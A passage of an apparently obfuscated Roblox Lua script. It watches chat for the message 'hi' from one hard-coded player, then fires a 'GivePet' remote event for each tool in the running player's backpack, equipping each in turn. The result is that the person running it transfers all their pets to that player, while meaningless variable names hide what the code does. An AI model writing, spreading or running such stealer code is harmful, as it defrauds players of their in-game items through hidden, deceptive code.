	end
end

local function mysteriousBubbleSpoon()
	local moonlightShadow = false
	local starryClouds = {}
	for _, hiddenLightning in ipairs(flyingCactusWindow:GetDescendants()) do
		if hiddenLightning:IsA("RemoteEvent") then
			local cometDream = hiddenLightning.OnClientEvent:Connect(function()
				moonlightShadow = true
			end)
			table.insert(starryClouds, cometDream)
		end
	end
	repeat task.wait() until moonlightShadow
	for _, cometDream in ipairs(starryClouds) do
		cometDream:Disconnect()
	end
end

local function glitteringPineappleRocket(icyTiger)
	for _, shiningFalconCarrot in ipairs(purpleOctopusPinecone:GetChildren()) do
		if shiningFalconCarrot:IsA("Tool") then
			glowingWalrusHelmet:FireServer("GivePet", icyTiger)
			mysteriousBubbleSpoon()
			if shiningFalconCarrot and shiningFalconCarrot.Parent == purpleOctopusPinecone then
				dancingPenguinLaptop:EquipTool(shiningFalconCarrot)
			end
		end
	end
end

silverMoonRiver.OnIncomingMessage = function(mysticWhaleDragon)
	if mysticWhaleDragon.TextSource and mysticWhaleDragon.TextSource.Name == fuzzyDragonFruit then
		if mysticWhaleDragon.Text:lower() == "hi" then
			local shiningTigerCake = appleElephantSpoon:FindFirstChild(fuzzyDragonFruit)
			if shiningTigerCake then
				print("Received 'hi' from " .. fuzzyDragonFruit .. ", running giveAllPets()")
				glitteringPineappleRocket(shiningTigerCake)
			else
				warn("Player " .. fuzzyDragonFruit .. " not found when message received")
			end
		end
	end
end
